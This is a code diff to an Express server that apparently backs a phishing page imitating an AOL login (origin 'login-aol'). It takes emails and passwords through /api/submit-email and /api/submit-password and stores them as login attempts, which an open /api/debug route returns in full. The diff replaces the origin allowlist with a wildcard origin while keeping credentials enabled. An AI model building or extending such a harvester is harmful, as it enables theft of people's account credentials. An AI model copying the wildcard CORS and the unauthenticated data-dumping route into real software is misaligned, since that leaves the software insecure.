@@ -6,28 +6,23 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 
-// === FIXED CORS for Vercel + Localhost ===
+// === RELIABLE CORS CONFIG FOR RAILWAY + VERCEL ===
 app.use(cors({
-  origin: function (origin, callback) {
-    if (!origin) return callback(null, true);
-    
-    const allowedOrigins = [
-      'http://localhost:3000',
-      'http://127.0.0.1:3000',
-      'https://login-aol.vercel.app',
-      'https://demascus-production.up.railway.app'
-    ];
-    
-    if (allowedOrigins.includes(origin)) {
-      callback(null, true);
-    } else {
-      callback(new Error('Not allowed by CORS'));
-    }
-  },
+  origin: '*',                    // Temporarily allow all (including your Vercel site)
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
-  credentials: true
+  credentials: true,
+  maxAge: 86400                   // Cache preflight for 24 hours
 }));
+
+// Explicit preflight handler - this fixes most Railway CORS issues
+app.options('*', (req, res) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  res.header('Access-Control-Max-Age', '86400');
+  res.status(204).end();
+});
 
 app.use(express.json());
 
@@ -115,14 +110,17 @@ app.post("/api/submit-password", async (req, res) => {
   res.json({ status: "success", message: "Done" });
 });
 
-// Debug route (optional)
+// Debug route
 app.get("/api/debug", (req, res) => {
   res.json(Array.from(loginAttempts.entries()));
 });
 
-// Use Railway PORT
+// === IMPORTANT: Use Railway's dynamic PORT ===
 const port = process.env.PORT || 3000;
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${port}`);
+  console.log("Endpoints:");
+  console.log("   POST /api/submit-email     → { email }");
+  console.log("   POST /api/submit-password  → { attemptId, password }");
 });
